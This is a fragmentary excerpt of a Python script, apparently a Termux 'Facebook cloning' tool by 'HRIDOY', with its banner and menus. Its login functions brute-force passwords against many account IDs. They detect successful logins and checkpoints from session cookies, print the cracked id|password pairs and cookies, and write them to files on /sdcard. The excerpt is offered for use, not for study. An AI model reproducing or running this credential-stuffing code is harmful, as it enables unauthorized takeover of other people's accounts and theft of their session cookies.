...
redmi=[]
try:
 print('\n\033[1;37m install modules....\n It will take some seconds...ITS,HRIDOY..')
...
\033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝    ╚═╝   
\033[1;97m-------------------------------------------------------------------------------------------------------
\033[1;32m CREATED BY : HRIDOY
\033[1;32m FACEBOK : MD HRIDOY MIA 
\033[1;32m GITHUB : HRIDOY-404
\033[1;32m TOOL STATUS : FREE
\033[1;32m PAGE : HRIDOY BRO2.0
\033[1;32m TOOL VIRSION : 1.0
\033[1;97m------------------------------------------------------------------------------------------------------- {P}""")
...
def mainx():
    ...
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning ")
    print(f'{K} [{H}8{K}] {N}Contract ADMIN')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://www.facebook.com/nh.hridoy.7869");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/nh.hridoy.7869");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}MAMUN-ISLAM {P}Terminal ');os.system("xdg-open https://www.facebook.com/nh.hridoy.7869");time.sleep(3);os.system('xdg-open https://www.facebook.com/mamun.islam.lam.sex');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/nh.hridoy.7869");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    print(f"{K} [{H}5{K}] {WHITE}Gmail  Cloning")
    print(f"{K} [{H}6{K}] {WHITE}Gmail  Cloning")
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/mamun.islam.lam.sex");mainx()
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mHRIDOY","\x1b[1;92mHRIDOY","\x1b[1;93mHRIDOY","\x1b[1;94mHRIDOY","\x1b[1;95mHRIDOY","\x1b[1;96mHRIDOY","\x1b[1;97mHRIDOY","\x1b[1;91mHRIDOY","\x1b[1;92mHRIDOY","\x1b[1;93mHRIDOY","\x1b[1;94mHRIDOY","\x1b[1;95mHRIDOY","\x1b[1;96mHRIDOY"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mHRIDOY-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/HRIDOY-GREEN-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}HRIDOY-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/HRIDOY-GREEN-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mHRIDOY-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/HRIDOY-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/HRIDOY-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [HRIDOY-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/HRIDOY-GREEN-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mHRIDOY-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/HRIDOY-GREEN-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
def m5(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mHRIDOY","\x1b[1;92mHRIDOY","\x1b[1;93mKING","\x1b[1;94mHRIDOY","\x1b[1;95mHRIDOY","\x1b[1;96mHRIDOY","\x1b[1;97mHRIDOY","\x1b[1;91mHRIDOY","\x1b[1;92mHRIDOY","\x1b[1;93mHRIDOY","\x1b[1;94mHRIDOY","\x1b[1;95mHRIDOY","\x1b[1;96mHRIDOY"])
